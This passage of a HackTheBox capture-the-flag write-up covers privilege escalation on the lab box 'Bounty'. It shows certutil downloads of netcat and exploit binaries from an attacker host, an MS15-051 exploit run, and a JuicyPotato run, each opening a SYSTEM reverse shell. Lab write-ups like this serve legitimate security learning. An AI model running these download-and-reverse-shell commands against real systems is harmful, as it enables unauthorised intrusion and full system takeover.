+<span class="go">                                 DHCP Enabled:    No</span>
+<span class="go">                                 IP address(es)</span>
+<span class="go">                                 [01]: 10.10.10.93</span>
+</pre></div>
+
+
+<p>The above <code>systeminfo</code> output gives us clues that this is a vanilla <code>Windows Server 2008 R2</code> since it has no hotfixes installed. Therefore there will be several exploits we could try. At this stage it was very easy because I had recently rooted another <a href="https://sittingducks.io/Bastard.html">htb box</a>, Bastard, with the same OS version using exploit for MS15-051. So I have used the exact same procedure to grab the root.txt which worked like a charm.</p>
+<ol>
+<li>I download both a 64-bit version of netcat and the MS15-051 exploit in the victim box with <code>certutil</code>:</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\public&gt; certutil -urlcache -split -f http://10.10.14.15/nc64.exe nc.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  0000  ...</span>
+<span class="go">  b0d8</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+
+<span class="go">PS C:\users\public&gt; certutil -urlcache -split -f http://10.10.14.15/ms15-051.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  0000  ...</span>
+<span class="go">  d800</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+</pre></div>
+
+
+<ol>
+<li>I get a privileged shell:</li>
+</ol>
+<p>running the script</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\public&gt; ./ms15-051.exe &quot;nc.exe -e cmd.exe 10.10.14.15 1234&quot;</span>
+</pre></div>
+
+
+<p>and listening on port 1234 with netcat:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0ff@SittingDucks]─[~/Tools]</span>
+<span class="go">└──╼ $sudo nc -lvnp 1234</span>
+<span class="go">listening on [any] 1234 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.93] 49167</span>
+<span class="go">Microsoft Windows [Version 6.1.7600]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\users\public&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">nt authority\system</span>
+
+<span class="go">C:\Users\Administrator\Desktop&gt;type root.txt</span>
+<span class="go">type root.txt</span>
+<span class="go">c8****************************ea</span>
+</pre></div>
+
+
+<p>Since it was too easy to get both flags I decided to repeat the same procedure with a different method, that is using <a href="https://github.com/decoder-it/juicy-potato">Juicy Potato</a>, a local privilege escalation tool. This tool leverages a vulnerability which theory is explained <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">here</a>.</p>
+<p>The idea behind this vulnerability is simple. To describe at a high level:</p>
+<div class="highlight"><pre><span></span><span class="go">1. Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.</span>
+<span class="go">2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.</span>
+<span class="go">3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.</span>
+</pre></div>
+
+
+<p>Accordingly, the concept of Juicy Potato is simple too: "If the user has <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges then you are SYSTEM". </p>
+<p>Before starting this other method I check if I have the requirements:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\merlin\desktop&gt; whoami /priv</span>
+
+<span class="go">PRIVILEGES INFORMATION</span>
+<span class="go">----------------------</span>
+
+<span class="go">Privilege Name                Description                               State   </span>
+<span class="go">============================= ========================================= ========</span>
+<span class="go">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span>
+<span class="go">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span>
+<span class="go">SeAuditPrivilege              Generate security audits                  Disabled</span>
+<span class="go">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span>
+<span class="go">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span>
+<span class="go">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span>
+</pre></div>
+
+
+<p>From the above output we can see <code>SeImpersonatePrivilege</code> is enabled, therefore we should be able to use the tool with no issues.</p>
+<p>First I donwload the project from github and compile the solution file with MS Vistual Studio to obtain an exe. Then I download the exe to Bounty with certutil. </p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\public&gt; certutil -urlcache -split -f http://10.10.14.15/JuicyPotato.exe jp.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  000000  ...</span>
+<span class="go">  054e00</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+</pre></div>
+
+
+<p>Then I run Juicy Potato so that it does its magic to give me a privileged netcat reverse shell:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\public&gt; ./jp.exe -l 1234 -t * -p nc.exe -a &quot;-e cmd.exe 10.10.14.15 4444&quot; -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&quot;</span>
+<span class="go">Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 1234</span>
+<span class="go">....</span>
+<span class="go">[+] authresult 0</span>
+<span class="go">{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM</span>
+
+<span class="go">[+] CreateProcessWithTokenW OK</span>
+</pre></div>
+
+
+<p>On my ParrotOS box I had setup a netcat listener on port 4444 so I get this:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0ff@SittingDucks]─[~/Tools]</span>
+<span class="go">└──╼ $sudo nc -lvnp 4444</span>
+<span class="go">listening on [any] 4444 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.93] 49184</span>
+<span class="go">Microsoft Windows [Version 6.1.7600]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">nt authority\system</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Bounty.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Bounty"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
